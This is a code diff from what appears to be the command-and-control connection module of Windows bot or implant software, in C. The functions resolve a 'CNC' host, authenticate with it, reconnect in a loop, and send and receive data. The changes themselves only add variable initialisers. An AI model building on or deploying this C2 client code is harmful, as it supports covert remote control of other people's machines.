@@ -9,12 +9,12 @@
 #include "logger.h"
 
 SOCKET cnc_sock = INVALID_SOCKET;
-char *cnc_host;
+char *cnc_host = NULL;
 
 void init_winsock()
 {
-    WSADATA wsaData;
-    int ret;
+    WSADATA wsaData = {};
+    int ret = 0;
 
     ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (ret)
@@ -24,7 +24,7 @@ void init_winsock()
 
 void get_cnc_addrinfo(struct addrinfo **result)
 {
-    int ret;
+    int ret = 0;
     char cnc_addr[255];
     long unsigned int cnc_addr_len = sizeof(cnc_addr);
     struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
@@ -50,7 +50,7 @@ void init_cnc_sock()
 
 void auth_with_cnc()
 {
-    int byte_count;
+    int byte_count = 0;
     char received_auth_key[AUTH_KEY_LEN];
 
     log_info("Authenticating with CNC.");
@@ -65,7 +65,7 @@ void auth_with_cnc()
 
 void connect_to_cnc(struct addrinfo *cnc_addrinfo)
 {
-    int ret;
+    int ret = 0;
 
     while (TRUE)
     {
@@ -92,7 +92,7 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
 
 void reconnect_to_cnc()
 {
-    struct addrinfo *cnc_addrinfo;
+    struct addrinfo *cnc_addrinfo = NULL;
 
     get_cnc_addrinfo(&cnc_addrinfo);
     init_cnc_sock();
@@ -101,7 +101,7 @@ void reconnect_to_cnc()
 
 int send_cnc(void *buf, size_t len)
 {
-    int bytes_sent;
+    int bytes_sent = 0;
 
     bytes_sent = send(cnc_sock, buf, len, 0);
     if (bytes_sent == SOCKET_ERROR)
@@ -116,7 +116,7 @@ int send_cnc(void *buf, size_t len)
 
 int recv_cnc(void *buf, size_t len)
 {
-    int bytes_read;
+    int bytes_read = 0;
 
     bytes_read = recv(cnc_sock, buf, len, 0);
     if (bytes_read == SOCKET_ERROR)
@@ -131,7 +131,7 @@ int recv_cnc(void *buf, size_t len)
 
 void init_cnc_conn(char *host)
 {
-    struct addrinfo *cnc_addrinfo;
+    struct addrinfo *cnc_addrinfo = NULL;
 
     cnc_host = host;
     init_winsock();
